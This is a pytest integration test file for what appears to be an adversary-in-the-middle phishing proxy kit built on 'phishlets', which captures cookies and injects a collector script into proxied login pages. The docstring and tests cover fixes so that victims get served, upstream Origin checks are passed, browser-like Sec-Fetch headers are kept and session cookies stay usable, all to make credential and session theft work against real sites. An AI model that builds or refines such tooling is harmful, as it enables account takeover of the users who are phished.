"""The proxy correctness fixes from the modern-login audit, each with a regression.

Every case here was reproduced on this tree before the fix:

* a Date-less upstream used to raise AttributeError inside rewrite_headers and the
  victim got NOTHING (the engine called the handler's date_time_string);
* Origin/Referer were forwarded verbatim, so the upstream saw the proxy's origin and
  an Origin-checked login was rejected;
* `Secure` was stripped from `__Host-`/`__Secure-`/SameSite=None cookies over plain
  HTTP, and browsers then discard those cookies entirely;
* the upstream Cookie header was an unscoped join, so a `Path=/admin; Secure` cookie
  travelled to `/public` and to sibling hosts;
* `Access-Control-Allow-Origin` went through the URL rewriter from "/";
* `Sec-Fetch-*` was stripped, which a real browser always sends;
* a body encoded with something we cannot decode was decoded with errors="replace"
  and shipped as HTML with the collector in front of it.
"""
import http.client
import os
import re
import socket
import socketserver
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

pytestmark = pytest.mark.integration

PAGE = b"<html><body><form><input name=username><input name=password></form></body></html>"


class Upstream(BaseHTTPRequestHandler):
    """Configurable: can omit Date, set cookies, or claim an exotic encoding."""
    protocol_version = "HTTP/1.1"
    omit_date = False
    extra_headers = ()
    body = PAGE
    seen = []

    def log_message(self, *a):
        pass

    def _send_headers(self, status, ctype="text/html; charset=utf-8", length=None):
        self.send_response_only(status)
        if not type(self).omit_date:
            self.send_header("Date", self.date_time_string())
        self.send_header("Content-Type", ctype)
        for k, v in type(self).extra_headers:
            self.send_header(k, v)
        self.send_header("Content-Length", str(length if length is not None
                                              else len(type(self).body)))
        self.end_headers()

    def do_GET(self):
        type(self).seen.append({"path": self.path,
                                "origin": self.headers.get("Origin"),
                                "referer": self.headers.get("Referer"),
                                "cookie": self.headers.get("Cookie", ""),
                                "sec_fetch_dest": self.headers.get("Sec-Fetch-Dest"),
                                "sec_fetch_mode": self.headers.get("Sec-Fetch-Mode")})
        body = type(self).body
        self._send_headers(200)
        self.wfile.write(body)

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n:
            self.rfile.read(n)
        self.do_GET()


class Up(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

    def __init__(self, handler=Upstream):
        super().__init__(("127.0.0.1", 0), handler)
        self.daemon_threads = True


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _serve(handler=Upstream):
    from core.phishlet import Phishlet, ProxyHost
    from core.proxy import ProxyEngine, serve_proxy
    Upstream.seen = []
    up = Up(handler)
    up_port = up.server_address[1]
    threading.Thread(target=up.serve_forever, daemon=True).start()
    ph = Phishlet(capture_cookies=["*"], inject_paths=[".*"], verify_tls=False)
    ph.proxy_hosts = [ProxyHost(domain="127.0.0.1", orig_sub="", phish_sub="",
                               scheme="http", port=up_port, is_landing=True)]
    engine = ProxyEngine(ph, db=None, geo_provider="off", logger=lambda *a: None)
    port = free_port()
    httpd = serve_proxy(engine, port, campaign="fixes")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.3)
    return engine, up, httpd, port


def _get(port, path="/login", headers=None):
    h = {"Host": "127.0.0.1"}
    h.update(headers or {})
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    conn.request("GET", path, headers=h)
    r = conn.getresponse()
    body = r.read()
    hs = r.getheaders()
    conn.close()
    return r.status, body, hs


class TestDateCrash:
    """Any upstream that omits Date used to send the victim nothing at all."""

    def teardown_method(self):
        Upstream.omit_date = False

    def test_a_date_less_upstream_still_serves(self):
        Upstream.omit_date = True
        engine, up, httpd, port = _serve()
        try:
            status, body, hs = _get(port)
            assert status == 200, status
            assert b"password" in body, body[:200]
            names = [k.lower() for k, _ in hs]
            assert names.count("date") == 1, hs
        finally:
            httpd.shutdown()
            up.shutdown()

    def test_the_engine_does_not_call_the_handlers_date_helper(self):
        """The regression was ProxyEngine calling date_time_string()."""
        from core import transport
        engine, up, httpd, port = _serve()
        try:
            r = transport.Response(200, transport._headers_dict({"Content-Type": "text/html"}),
                                   b"<html>x</html>")
            out = engine.rewrite_headers(r, over_tls=False)
            assert any(k.lower() == "date" for k, _ in out)
        finally:
            httpd.shutdown()
            up.shutdown()


class TestOriginAndReferer:

    def test_the_upstream_sees_its_own_origin(self):
        engine, up, httpd, port = _serve()
        try:
            _get(port, headers={"Origin": f"http://127.0.0.1:{port}",
                                "Referer": f"http://127.0.0.1:{port}/login"})
            seen = Upstream.seen[-1]
            assert seen["origin"] == f"http://127.0.0.1:{up.server_address[1]}", seen
            assert seen["referer"] == f"http://127.0.0.1:{up.server_address[1]}/login", seen
            assert str(port) not in (seen["origin"] or ""), "the proxy port leaked"
        finally:
            httpd.shutdown()
            up.shutdown()

    def test_sec_fetch_headers_are_forwarded(self):
        engine, up, httpd, port = _serve()
        try:
            _get(port, headers={"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate"})
            seen = Upstream.seen[-1]
            assert seen["sec_fetch_dest"] == "document", seen
            assert seen["sec_fetch_mode"] == "navigate", seen
        finally:
            httpd.shutdown()
            up.shutdown()


class TestCookieAttributes:

    def _cookies(self, extra):
        Upstream.extra_headers = extra
        engine, up, httpd, port = _serve()
        try:
            _, _, hs = _get(port)
            return [v for k, v in hs if k.lower() == "set-cookie"]
        finally:
            httpd.shutdown()
            up.shutdown()
            Upstream.extra_headers = ()

    def test_a_host_prefixed_cookie_keeps_secure(self):
        got = self._cookies([("Set-Cookie", "__Host-sess=abc; Path=/; Secure; HttpOnly")])
        assert any("__Host-sess" in c and "Secure" in c for c in got), got

    def test_a_secure_prefixed_cookie_keeps_secure(self):
        got = self._cookies([("Set-Cookie", "__Secure-tok=def; Path=/; Secure")])
        assert any("__Secure-tok" in c and "Secure" in c for c in got), got

    def test_a_samesite_none_cookie_keeps_secure(self):
        got = self._cookies([("Set-Cookie", "s=1; Path=/; Secure; SameSite=None")])
        assert any("Secure" in c for c in got), got

    def test_an_ordinary_cookie_loses_secure_over_plain_http(self):
        got = self._cookies([("Set-Cookie", "plain=1; Path=/; Secure; HttpOnly")])
        assert got and "Secure" not in got[0], got


class TestCookieScoping:

    def test_a_path_scoped_cookie_is_not_sent_wider(self):
        engine, up, httpd, port = _serve()
        try:
            sid = ""
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
            conn.request("GET", "/login", headers={"Host": "127.0.0.1"})
            r = conn.getresponse()
            r.read()
            for k, v in r.getheaders():
                if k.lower() == "set-cookie" and v.startswith("__bhs="):
                    sid = v.split("=")[1].split(";")[0]
            conn.close()
            sess = engine.sessions[sid]
            sess.note_cookies(engine.phishlet,
                              ["admin=TOPSECRET; Path=/admin", "sess=1; Path=/"],
                              host="127.0.0.1")
            _get(port, "/public", headers={"Cookie": f"__bhs={sid}"})
            seen = Upstream.seen[-1]
            assert "TOPSECRET" not in seen["cookie"], seen
            assert "sess=1" in seen["cookie"], seen
        finally:
            httpd.shutdown()
            up.shutdown()


class TestHeadersNotMangled:

    def test_access_control_allow_origin_is_left_alone(self):
        Upstream.extra_headers = [("Access-Control-Allow-Origin", "https://api.real.test"),
                                  ("Access-Control-Allow-Credentials", "true")]
        engine, up, httpd, port = _serve()
        try:
            _, _, hs = _get(port)
            got = {k.lower(): v for k, v in hs}
            assert got["access-control-allow-origin"] == "https://api.real.test", got
        finally:
            httpd.shutdown()
            up.shutdown()
            Upstream.extra_headers = ()

    def test_a_body_we_cannot_decode_is_passed_through_untouched(self):
        """Compressed bytes must never be decoded with errors=replace and shipped."""
        Upstream.body = b"\x28\xb5\x2f\xfd" + b"\x00" * 40          # zstd magic + junk
        Upstream.extra_headers = [("Content-Encoding", "zstd")]
        engine, up, httpd, port = _serve()
        try:
            status, body, hs = _get(port)
            assert status == 200
            assert body == Upstream.body, "the body was altered"
            assert not re.search(rb"<script", body), "a collector was injected into binary"
            enc = {k.lower(): v for k, v in hs}.get("content-encoding", "")
            assert enc == "", "an encoding we did not decode must not be re-sent"
        finally:
            httpd.shutdown()
            up.shutdown()
            Upstream.body = PAGE
            Upstream.extra_headers = ()
